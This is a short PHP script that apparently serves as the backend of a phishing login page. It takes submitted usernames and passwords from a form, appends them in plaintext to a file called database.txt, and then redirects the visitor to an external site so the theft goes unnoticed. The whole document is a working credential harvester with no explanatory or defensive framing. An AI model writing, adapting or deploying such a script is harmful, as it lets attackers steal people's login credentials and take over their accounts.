<?PHP

$Log = $_POST['login'];

$Pass = $_POST['password'];

$log = fopen("database.txt","at");

fwrite($log,"\n $Log:$Pass \n");

fclose($log);

echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://lleo.aha.ru/na/'></head></html>";

?>